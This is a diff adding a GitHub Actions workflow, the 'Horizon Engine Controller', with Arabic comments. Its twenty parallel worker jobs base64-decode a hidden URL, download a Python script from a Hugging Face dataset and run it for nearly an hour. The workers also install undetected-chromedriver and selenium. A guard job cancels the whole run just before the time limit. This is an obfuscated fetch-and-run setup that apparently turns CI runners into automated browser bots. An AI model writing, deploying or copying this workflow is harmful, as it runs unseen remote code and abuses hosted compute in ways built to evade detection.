@@ -1,0 +1,91 @@
+name: Horizon Engine Controller
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: horizon-sync-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Core Guard: يُراقب وقت التشغيل ويقوم بإنهاء الجلسة بعد 59 دقيقة
+  # =================================================================
+  core-guard:
+    name: "System Guard"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      MAX_WATCH_TIME: 3540
+    steps:
+      - name: Initialize Timer Guard
+        run: |
+          echo "[GUARD] Active monitoring initialized for run: ${{ github.run_id }}"
+          echo "[GUARD] Operational window set to ${MAX_WATCH_TIME} seconds."
+
+          sleep "${MAX_WATCH_TIME}"
+
+          echo "[GUARD] Target threshold reached — issuing global abort signal."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[GUARD] Abort signal sent. Terminating active tasks."
+
+  # =================================================================
+  # Worker Grid: تشغيل التوازي للعقد الاحتياطية
+  # =================================================================
+  worker-grid:
+    name: "Worker-${{ matrix.node_code }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_code: [h-1, y-2, y-3, r-4, g-5, j-6, j-7, j-8, j-9, j-0, j-1, j-2, j-3, j-4, j-5, j-6, j-7, j-8, j-9, 9920]
+
+    steps:
+      # #################################################################
+      # المرحلة الأولى: تجهيز البيئة وتنزيل الملف والاعتمادات دفعة واحدة
+      # #################################################################
+      - name: Environment Setup & Fetch Component
+        run: |
+          echo "[INIT] Provisioning dependencies on Node-${{ matrix.node_code }}..."
+          sudo apt-get update -qq && sudo apt-get install -y curl python3-pip
+          
+          echo "[FETCH] Resolving endpoint payload..."
+          REMOTE_SRC=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$REMOTE_SRC" -o app_runner.py
+          
+          echo "[PACKAGES] Installing engine libraries..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # #################################################################
+      # المرحلة الثانية: تشغيل محرك التطبيق ومراقب الوقت
+      # #################################################################
+      - name: Execute Main Process
+        run: |
+          echo "[START] Spawning process on Node-${{ matrix.node_code }}..."
+
+          python3 app_runner.py &
+          TASK_PID=$!
+
+          echo "[RUNNING] Subprocess started (PID: $TASK_PID). Upper limit: 3540s."
+
+          sleep 3540
+
+          if kill -0 "$TASK_PID" 2>/dev/null; then
+            echo "[TIMEOUT] Maximum session boundary reached. Terminating process..."
+            kill -9 "$TASK_PID"
+            echo "[SUCCESS] Subprocess stopped."
+          else
+            echo "[COMPLETE] Subprocess finalized naturally before boundary limit."
+          fi
